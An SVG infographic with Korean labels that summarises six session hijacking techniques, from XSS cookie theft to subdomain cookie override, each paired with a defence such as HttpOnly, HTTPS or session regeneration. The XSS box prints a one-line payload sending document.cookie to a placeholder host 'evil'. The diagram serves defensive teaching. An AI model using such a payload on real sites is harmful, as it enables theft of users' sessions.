<svg xmlns="http://www.w3.org/2000/svg" width="880" height="480" viewBox="0 0 880 480">
  <rect width="880" height="480" fill="#0a0a0a" rx="12"/>

  <text x="440" y="44" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="22" font-weight="700" fill="#e8e8e8" text-anchor="middle">세션 하이재킹 공격 기법</text>

  <!-- Method 1: XSS -->
  <rect x="50" y="70" width="380" height="120" rx="8" fill="#100a0a" stroke="#e05555" stroke-width="1.5"/>
  <rect x="50" y="70" width="6" height="120" rx="3" fill="#e05555"/>
  <text x="90" y="97" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="14" font-weight="600" fill="#e05555">① XSS를 통한 쿠키 탈취</text>
  <text x="70" y="120" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
        font-size="12" fill="#ce9178">document.location='http://evil/?c='</text>
  <text x="70" y="140" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
        font-size="12" fill="#ce9178">  + document.cookie</text>
  <text x="70" y="162" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">방어: HttpOnly 쿠키, CSP</text>
  <text x="400" y="131" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#55c555" text-anchor="end">HttpOnly로 방어 가능</text>

  <!-- Method 2: Network sniffing -->
  <rect x="450" y="70" width="380" height="120" rx="8" fill="#100a0a" stroke="#e05555" stroke-width="1.5"/>
  <rect x="450" y="70" width="6" height="120" rx="3" fill="#e05555"/>
  <text x="490" y="97" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="14" font-weight="600" fill="#e05555">② 네트워크 스니핑</text>
  <text x="470" y="120" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="12" fill="#888">HTTP 트래픽에서 쿠키 탈취</text>
  <text x="470" y="140" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="12" fill="#888">공공 Wi-Fi, ARP 스푸핑</text>
  <text x="470" y="162" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">방어: HTTPS 필수, Secure 쿠키</text>
  <text x="820" y="131" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#55c555" text-anchor="end">HTTPS로 방어</text>

  <!-- Method 3: Predictable session ID -->
  <rect x="50" y="210" width="380" height="120" rx="8" fill="#100a0a" stroke="#e08855" stroke-width="1.5"/>
  <rect x="50" y="210" width="6" height="120" rx="3" fill="#e08855"/>
  <text x="90" y="237" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="14" font-weight="600" fill="#e08855">③ 예측 가능한 세션 ID 추측</text>
  <text x="70" y="260" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
        font-size="12" fill="#888">SID = user_id + timestamp</text>
  <text x="70" y="280" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
        font-size="12" fill="#888">SID = MD5(email)</text>
  <text x="70" y="302" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">방어: CSPRNG으로 생성, 128비트 이상</text>

  <!-- Method 4: Session fixation (reference) -->
  <rect x="450" y="210" width="380" height="120" rx="8" fill="#100a0a" stroke="#e08855" stroke-width="1.5"/>
  <rect x="450" y="210" width="6" height="120" rx="3" fill="#e08855"/>
  <text x="490" y="237" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="14" font-weight="600" fill="#e08855">④ 세션 고정 (Session Fixation)</text>
  <text x="470" y="260" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="12" fill="#888">공격자가 세션 ID를 미리 설정</text>
  <text x="470" y="280" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="12" fill="#888">피해자가 로그인하면 탈취</text>
  <text x="470" y="302" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">방어: 로그인 후 세션 재생성</text>

  <!-- Method 5: Cross-site request -->
  <rect x="50" y="350" width="380" height="100" rx="8" fill="#100a0a" stroke="#888" stroke-width="1.5"/>
  <rect x="50" y="350" width="6" height="100" rx="3" fill="#888"/>
  <text x="90" y="377" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="14" font-weight="600" fill="#888">⑤ CSRF로 세션 악용</text>
  <text x="70" y="400" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="12" fill="#666">피해자 세션으로 의도치 않은 요청 실행</text>
  <text x="70" y="420" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#666">방어: SameSite=Strict, CSRF 토큰</text>

  <!-- Method 6: Subdomain cookie -->
  <rect x="450" y="350" width="380" height="100" rx="8" fill="#100a0a" stroke="#888" stroke-width="1.5"/>
  <rect x="450" y="350" width="6" height="100" rx="3" fill="#888"/>
  <text x="490" y="377" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="14" font-weight="600" fill="#888">⑥ 서브도메인 쿠키 오버라이드</text>
  <text x="470" y="400" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="12" fill="#666">서브도메인에서 상위 도메인 쿠키 덮어쓰기</text>
  <text x="470" y="420" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#666">방어: 쿠키 domain 속성 미설정 (정확한 호스트만)</text>

  <text x="440" y="470" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="12" fill="#666" text-anchor="middle">HttpOnly + Secure + SameSite=Strict + HTTPS + 세션 재생성 = 대부분의 하이재킹 방어</text>
</svg>
